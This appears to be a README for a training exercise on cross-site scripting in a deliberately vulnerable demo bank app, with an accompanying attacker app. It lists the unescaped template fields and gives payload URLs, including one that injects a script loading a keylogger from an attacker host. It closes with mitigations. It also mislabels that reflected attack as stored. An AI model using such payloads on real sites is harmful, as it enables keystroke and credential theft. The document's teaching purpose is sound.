# Exercise 2 - XXS 

XSS exercise to help ypu understand XSS and its mitigations

## Setup and Start Applications

1. check out exercise1 
   * from command line: 'git checkout exercise1'
1. start the v-bank-app in debug mode
   * with maven command:'mvn clean spring-boot:run -f ./v-bank-app/pom.xml'
1. start the attacker-app
   * woth maven command: 'mvn clean spring-boot:run -f ./attacker-app/pom.xml'
   
## Search for XSS vulnerabilities

Hints:
* This app is a rather traditional multi page application with not much Ajax/Javascript magic. Therefore it is (mostly) susceptible to source based XSS vulnerabilities.
* Look for reflected XSS vulnerabilities where request parameters are directly written to the HTML output (page.tag is template used for all pages)
* Look for stored XSS vulnerabilities where form values are saved without validation/encoding/sanitization and then / or printed without escaping

Present vulnerabilities:
* page.tag template prints a number of requests parameters into the HTML without escaping:
  * *error* : `<div ...>${error}</div>`
  * *info* : `<div ...>${info}</div>` 
  * *message* : `<div ...>${message}</div>`
* *transfer.jsp* and *BankController.doTransfer(...)* save the transfer details without validation/etc. and *history.jsp* displays them w/o escaping

##Exploit and understand
1. Test reflected XSS in login page: http://vbank.0.0.0.0.xip.io:8080/login?info=%3Cscript%3Ealert(1)%3C/script%3E
1. Exploit stored XSS in login page:
   * As Alice send Bob the login link with installs a keylogger by exploiting the vulnerability: 
     http://vbank.0.0.0.0.xip.io:8080/login?info=<script src="http://attack.0.0.0.0.xip.io:9090/js/keylog.js"></script>
1. Test stored XSS 

Mitigations:
  * validate input
  * encode text input (i.e. with HTML encoding)
  * sanitize text/HTML input (remove potentially dangerous char sequences)
  * escape output (replace control characters into renderable counterparts that are not interpreted as controls/commands by the parser)

  
